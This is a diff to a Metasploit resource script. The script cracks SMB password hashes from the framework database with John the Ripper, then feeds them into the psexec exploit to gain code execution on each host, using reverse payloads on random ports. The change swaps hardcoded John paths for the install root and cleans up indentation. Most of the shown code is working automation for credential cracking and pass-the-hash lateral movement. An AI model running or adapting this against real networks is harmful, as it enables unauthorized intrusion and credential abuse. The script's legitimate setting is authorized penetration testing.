@@ -8,10 +8,6 @@
 
 
 <ruby>
-#setting jtr path details:
-jtrbase = "/opt/metasploit4/apps/pro/msf3/data/john"	# fix this - is there a easy way to get this path?!?
-jtrpath = "/opt/metasploit4/apps/pro/msf3/data/john"	# fix this - is there a easy way to get this path?!?
-
 #psexec needs a payload
 if framework.datastore['PAYLOAD'] 
 	pload = framework.datastore['PAYLOAD'] 
@@ -31,9 +27,9 @@ else
 end
 
 if (framework.datastore['VERBOSE'] == "true")   #we look in the global datastore for a global VERBOSE option and use it
-        verbose = 1 #true
+	verbose = 1 #true
 else
-        verbose = 0
+	verbose = 0
 end
 
 def infos(serv,creds,host)
@@ -60,8 +56,9 @@ framework.db.creds.each do |creds|	# just checking if we have any smb_hashes in 
 
 	 	print_line("using jtr_crack_fast")
 		run_single("use auxiliary/analyze/jtr_crack_fast")
-		run_single("set JOHN_BASE #{jtrbase}")
-		run_single("set JOHN_PATH #{jtrpath}")
+		# we use the info from Msf::Config.install_root and append the following path to it (thx to sinn3r)
+		run_single("set JOHN_BASE #{Msf::Config.install_root}/data/john")
+		run_single("set JOHN_PATH #{Msf::Config.install_root}/data/john")
 		run_single("run -j")
 		run_single("back")
 		jotr = 0		# jtr modules tries to crack all smb_hashes from the db ... so we could leave it now
@@ -82,21 +79,20 @@ framework.db.creds.each do |creds|	# just checking if we have any smb_hashes in 
 			if(verbose == 1)
 				infos(serv,creds,host)
 			end
-                	run_single("use exploit/windows/smb/psexec")
-                        run_single("set RHOST #{host.address}")
-	                run_single("set RPORT #{serv.port}")
-		        run_single("set SMBUser #{username}")
-		        run_single("set SMBPass #{smbhash}")
-        	        run_single("set PAYLOAD #{pload}")
+			run_single("use exploit/windows/smb/psexec")
+			run_single("set RHOST #{host.address}")
+			run_single("set RPORT #{serv.port}")
+			run_single("set SMBUser #{username}")
+			run_single("set SMBPass #{smbhash}")
+			run_single("set PAYLOAD #{pload}")
 			if pload =~ /reverse/
 				run_single("set LPORT #{(rand(0x8fff) + 4000).to_s}")
 			end
-        	        if(verbose == 1)
-                		run_single("set VERBOSE true")
+			if(verbose == 1)
+				run_single("set VERBOSE true")
 			end
-        	        run_single("exploit -j -z")
-                	run_single("back")
-
+			run_single("exploit -j -z")
+			run_single("back")
 		end
 	end
 end
